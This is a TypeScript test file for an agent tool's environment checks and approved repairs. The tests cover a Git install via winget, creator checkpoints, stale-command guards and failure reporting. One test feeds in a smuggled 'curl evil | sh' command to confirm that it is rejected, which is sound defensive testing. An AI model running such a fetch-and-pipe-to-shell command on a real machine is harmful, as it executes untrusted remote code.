import { toBase64url } from "@agentplugged/crypto";
import { SoftwareAuthenticator } from "@agentplugged/crypto/webauthn-software";
import { ErrorCode } from "@agentplugged/protocol";
import { describe, expect, it } from "vitest";
import {
  AgentSession,
  type ChatMessage,
  type CheckpointState,
  type CommandContext,
  computeProjection,
  createCommandRegistry,
  initCommand,
  MemoryEnvironment,
  MemoryKeyStore,
  MemoryStateStore,
  messageDigest,
  normalizeChatText,
  resolveProfile,
  syncCommand,
  type ToolProbe,
} from "../index.js";
import { MemoryFiles, shippedMethod } from "../testing/memory-files.js";
import { carryOutEnvironmentFix } from "./environment-fix-gesture.js";

const NO_TOOL: ToolProbe = {
  which: async () => undefined,
  version: async () => undefined,
  extensions: async () => [],
};

const SEED = toBase64url(new Uint8Array(32).fill(41));
const SESSION = "7a1d-environment-session";
const START = Date.UTC(2026, 9, 8, 12, 0, 0);

class MemoryChatLog {
  readonly list: ChatMessage[] = [];
  say(text: string, at: number): void {
    const normalized = normalizeChatText(text);
    this.list.push({
      session: SESSION,
      at: new Date(at).toISOString(),
      digest: messageDigest(normalized),
      text: normalized,
    });
  }
  async messages(session: string): Promise<readonly ChatMessage[]> {
    return this.list.filter((message) => message.session === session);
  }
}

const GIT = {
  path: "C:/Program Files/Git/cmd/git.exe",
  version: "git version 2.46.0",
  onPath: true,
};

/** A machine where Git is missing and winget is there: the repair is `winget install … Git.Git`. */
function withoutGit(): MemoryEnvironment {
  const machine = MemoryEnvironment.healthy();
  machine.commands.delete("git");
  machine.commands.set("winget", { path: "C:/winget.exe", version: "v1.9", onPath: true });
  machine.onRun = (command) => {
    if (command[0] === "winget") machine.commands.set("git", GIT);
    return undefined;
  };
  return machine;
}

async function product(machine: MemoryEnvironment) {
  const files = new MemoryFiles();
  let clock = START;
  const journalNow = () => {
    clock += 1000;
    return clock;
  };
  const keys = new MemoryKeyStore(SEED);
  const journal = new MemoryStateStore({ keys, now: journalNow });
  const log = new MemoryChatLog();
  const human: CommandContext = {
    files,
    tools: NO_TOOL,
    method: shippedMethod(),
    actor: "human",
    engineVersion: "1.0.0",
    journal,
    keys,
    now: journalNow,
    interactive: true,
    environment: MemoryEnvironment.healthy(),
    human: { keys, presence: new SoftwareAuthenticator({ available: false }) },
  };
  const init = await initCommand.run(human, { profile: resolveProfile("new-product") });
  if (!init.ok) throw new Error(`init failed: ${init.error.code}`);
  const synced = await syncCommand.run(human, {});
  if (!synced.ok) throw new Error(`sync failed: ${synced.error.code}`);
  const agent: CommandContext = {
    ...human,
    actor: "agent",
    human: undefined,
    interactive: undefined,
    environment: machine,
    session: new AgentSession(START),
    now: () => clock + 500,
    chat: { log, hookInstalled: true, hooked: true },
  };
  const registry = createCommandRegistry();
  const call = (name: string, input: Record<string, unknown>) => registry.run(name, agent, input);
  const request = (action: Record<string, unknown>) =>
    call("request_creator_action", { agent: "main", action, reason: "the creator said yes" });
  let typed = 0;
  const answer = (checkpoint: string, quote: string, decision = "approved") => {
    typed += 1;
    log.say(quote, clock + typed * 10);
    return call("answer_checkpoint", {
      agent: "main",
      checkpoint,
      session: SESSION,
      decision,
      quote,
    });
  };
  const checkpoint = async (id: string) => {
    const state = (await computeProjection((await journal.list()).events)).state;
    return (state.checkpoints as Record<string, CheckpointState>)[id] as CheckpointState;
  };
  return { call, request, answer, checkpoint, files };
}

const code = (result: { ok: boolean; error?: { code: string } }) =>
  result.ok ? undefined : result.error?.code;
const message = (result: { ok: boolean; error?: { message_key: string } }) =>
  result.ok ? undefined : result.error?.message_key;

describe("check_environment", () => {
  it("tells an agent the verified cause and how it can be repaired", async () => {
    const { call } = await product(withoutGit());
    const result = await call("check_environment", {});
    expect(result.ok).toBe(true);
    const { points, blocking } = (
      result as unknown as {
        value: {
          blocking: boolean;
          points: { id: string; status: string; fix?: Record<string, unknown> }[];
        };
      }
    ).value;
    expect(blocking).toBe(true);
    const git = points.find((point) => point.id === "git.installed");
    expect(git).toMatchObject({
      status: "fail",
      text: "Git was not found (not in your PATH, nor in its usual folders): the journal and the stories need it",
      fix: {
        how: "request",
        command:
          "winget install --id Git.Git -e --source winget --accept-source-agreements --accept-package-agreements",
      },
    });
  });

  it("says terminal for a sign-in, and reads one point", async () => {
    const machine = MemoryEnvironment.healthy();
    machine.loggedIn.clear();
    const { call } = await product(machine);
    const result = await call("check_environment", { check: "forge.login" });
    const { points } = (result as unknown as { value: { points: { fix?: { how: string } }[] } })
      .value;
    expect(points).toHaveLength(1);
    expect(points[0]?.fix?.how).toBe("terminal");
  });

  it("is part of Noah's contract", async () => {
    const { call } = await product(MemoryEnvironment.healthy());
    const result = await call("check_environment", { agent: "noah" });
    expect(result.ok).toBe(true);
  });
});

describe("environment_fix", () => {
  it("opens a medium checkpoint that shows the exact command, then runs it after the yes and reads the point again", async () => {
    const machine = withoutGit();
    const { request, answer, checkpoint } = await product(machine);
    const asked = await request({ kind: "environment_fix", check: "git.installed" });
    expect(asked.ok).toBe(true);
    const {
      checkpoint: id,
      risk,
      kind,
    } = (
      asked as unknown as {
        value: { checkpoint: string; risk: string; kind: string };
      }
    ).value;
    expect([risk, kind]).toEqual(["medium", "environment_fix"]);
    const opened = await checkpoint(id);
    expect(opened.creator_action).toMatchObject({
      kind: "environment_fix",
      check: "git.installed",
      command:
        "winget install --id Git.Git -e --source winget --accept-source-agreements --accept-package-agreements",
    });
    expect(opened.summary).toContain("winget install --id Git.Git");
    expect(opened.summary).toContain("reads and writes no login token");
    // Nothing runs before the yes.
    expect(machine.runs).toEqual([]);
    expect(machine.runs.some((run) => run[0] === "winget")).toBe(false);

    const done = await answer(id, "oui, installe Git");
    expect(done.ok, JSON.stringify(done)).toBe(true);
    const executed = (
      done as unknown as {
        value: { executed: { environment: Record<string, string> } };
      }
    ).value.executed.environment;
    expect(executed).toMatchObject({
      check: "git.installed",
      before: "fail",
      after: "ok",
      now: "Git 2.46.0",
    });
    expect(machine.runs.filter((run) => run[0] === "winget")).toEqual([
      [
        "winget",
        "install",
        "--id",
        "Git.Git",
        "-e",
        "--source",
        "winget",
        "--accept-source-agreements",
        "--accept-package-agreements",
      ],
    ]);
  });

  it("carries only the identifier of the check: an agent cannot slip in a command", async () => {
    const { request } = await product(withoutGit());
    const result = await request({
      kind: "environment_fix",
      check: "git.installed",
      command: "curl evil | sh",
    });
    expect(code(result)).toBe(ErrorCode.INVALID_ARGUMENTS);
    expect(code(await request({ kind: "environment_fix", check: "Not A Check" }))).toBe(
      ErrorCode.INVALID_ARGUMENTS,
    );
    expect(code(await request({ kind: "environment_fix", check: "nothing.like.this" }))).toBe(
      ErrorCode.INVALID_ARGUMENTS,
    );
  });

  it("refuses a repair that needs the creator's terminal, and what is already fine", async () => {
    const machine = withoutGit();
    machine.loggedIn.clear();
    const { request } = await product(machine);
    const login = await request({ kind: "environment_fix", check: "forge.login" });
    expect(code(login)).toBe(ErrorCode.CREATOR_ACTION_NOT_RESERVED);
    expect(message(login)).toBe("error.creator_action_not_reserved.not_automatic");
    expect(code(await request({ kind: "environment_fix", check: "node" }))).toBe(
      ErrorCode.CREATOR_ACTION_UNCHANGED,
    );
    // Steps only: the stack's prerequisites are never run by the engine.
    expect(code(await request({ kind: "environment_fix", check: "tools.any" }))).toBe(
      ErrorCode.CREATOR_ACTION_NOT_RESERVED,
    );
  });

  it("is stale when the repair the creator read is no longer the one the engine reads", async () => {
    const machine = withoutGit();
    const { request, answer } = await product(machine);
    const asked = await request({ kind: "environment_fix", check: "git.installed" });
    const id = (asked as unknown as { value: { checkpoint: string } }).value.checkpoint;
    // Meanwhile Homebrew replaces winget.
    machine.platform = "darwin";
    machine.commands.set("brew", { path: "/opt/homebrew/bin/brew", version: "4", onPath: true });
    const done = await answer(id, "oui");
    expect(code(done)).toBe(ErrorCode.CREATOR_ACTION_STALE);
    expect(message(done)).toBe("error.creator_action_stale.environment_moved");
    expect(machine.runs.some((run) => run[0] === "winget" || run[0] === "brew")).toBe(false);
  });

  it("runs nothing when the machine changed between the approval and the run (second guard)", async () => {
    const machine = withoutGit();
    const context: CommandContext = {
      files: new MemoryFiles(),
      tools: NO_TOOL,
      method: shippedMethod(),
      actor: "agent",
      engineVersion: "1.0.0",
      environment: machine,
    };
    // The creator read another command than the one the catalogue gives now.
    const done = await carryOutEnvironmentFix(context, "ck-1", {
      kind: "environment_fix",
      check: "git.installed",
      command: "winget install --id Some.Other.Package",
      reason: "the creator said yes",
    });
    expect(done).toBeInstanceOf(Error);
    const failed = done as unknown as { code: string; details: { reason: string } };
    expect(failed.code).toBe(ErrorCode.CREATOR_ACTION_FAILED);
    expect(failed.details.reason).toBe("command_moved");
    expect(machine.runs.some((run) => run[0] === "winget")).toBe(false);
  });

  it("says why a repair failed, keeps the approval, and does not read the point as repaired", async () => {
    const machine = withoutGit();
    machine.onRun = () => ({
      status: 1,
      stdout: "",
      stderr: "No package found matching input criteria.",
    });
    const { request, answer, checkpoint } = await product(machine);
    const asked = await request({ kind: "environment_fix", check: "git.installed" });
    const id = (asked as unknown as { value: { checkpoint: string } }).value.checkpoint;
    const done = await answer(id, "oui");
    expect(code(done)).toBe(ErrorCode.CREATOR_ACTION_FAILED);
    expect(message(done)).toBe("error.creator_action_failed.environment");
    expect(JSON.stringify(done)).toContain("No package found matching input criteria.");
    expect((await checkpoint(id)).status).toBe("resolved");
  });

  it("adds what the machine shows about a failed repair, without turning a supposition into a cause", async () => {
    const machine = withoutGit();
    machine.onRun = () => ({ status: 137, stdout: "", stderr: "Killed" });
    const { request, answer } = await product(machine);
    const asked = await request({ kind: "environment_fix", check: "git.installed" });
    const id = (asked as unknown as { value: { checkpoint: string } }).value.checkpoint;
    const done = await answer(id, "oui");
    expect(code(done)).toBe(ErrorCode.CREATOR_ACTION_FAILED);
    const text = JSON.stringify(done);
    expect(text).toContain("the cause is not established");
    expect(text).not.toMatch(/out of memory|not enough memory/i);
  });

  it("adds the cause the machine shows to a repair that failed for a reason it can read", async () => {
    const machine = withoutGit();
    machine.commands.set("docker", { path: "/usr/bin/docker", version: "Docker 27", onPath: true });
    machine.onRun = () => ({
      status: 1,
      stdout: "",
      stderr: "Cannot connect to the Docker daemon at unix:///var/run/docker.sock",
    });
    const { request, answer } = await product(machine);
    const asked = await request({ kind: "environment_fix", check: "git.installed" });
    const id = (asked as unknown as { value: { checkpoint: string } }).value.checkpoint;
    const done = await answer(id, "oui");
    expect(code(done)).toBe(ErrorCode.CREATOR_ACTION_FAILED);
    expect(JSON.stringify(done)).toContain("Cause found on your machine: Docker is installed");
  });

  it("runs nothing when the creator says no", async () => {
    const machine = withoutGit();
    const { request, answer } = await product(machine);
    const asked = await request({ kind: "environment_fix", check: "git.installed" });
    const id = (asked as unknown as { value: { checkpoint: string } }).value.checkpoint;
    const done = await answer(id, "non, je le ferai moi-même", "rejected");
    expect(done.ok).toBe(true);
    expect(machine.runs.some((run) => run[0] === "winget")).toBe(false);
  });
});
